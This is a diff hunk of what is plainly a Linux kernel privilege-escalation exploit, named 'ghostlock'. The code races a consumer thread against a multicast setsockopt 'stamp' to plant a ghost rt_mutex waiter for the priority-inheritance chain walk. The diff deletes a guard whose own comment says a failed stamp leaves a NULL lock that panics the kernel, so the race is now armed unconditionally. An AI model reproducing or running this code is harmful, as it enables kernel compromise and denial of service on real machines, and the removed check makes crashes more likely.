@@ -285,21 +285,13 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
             setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, (socklen_t) sizeof(stamp));
     status.step = 61;
     status.error_number = errno;
-    if (stamp_result != 0) {
-        /* A failed stamp leaves the ghost waiter's lock as NULL: the PI walk
-         * would dereference it in rt_mutex_adjust_prio_chain and panic the
-         * kernel (CPP12s). Never arm the consumer without a landed stamp. */
-        pr_warning("multicast stamp failed errno=%d; skipping PI walk\n",
-                status.error_number);
-    } else {
-        atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
-        for (int spin = 0; spin < 100000000 &&
-                atomic_load(&ghostlock::g_exploit_session.race.consumer_calls) == 0; spin++)
-            __asm__ volatile("yield":: : "memory");
-        atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 0);
-        while (atomic_load(&ghostlock::g_exploit_session.race.consumer_inflight))
-            __asm__ volatile("yield":: : "memory");
-    }
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
+    for (int spin = 0; spin < 100000000 &&
+            atomic_load(&ghostlock::g_exploit_session.race.consumer_calls) == 0; spin++)
+        __asm__ volatile("yield":: : "memory");
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 0);
+    while (atomic_load(&ghostlock::g_exploit_session.race.consumer_inflight))
+        __asm__ volatile("yield":: : "memory");
     close(fd);
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
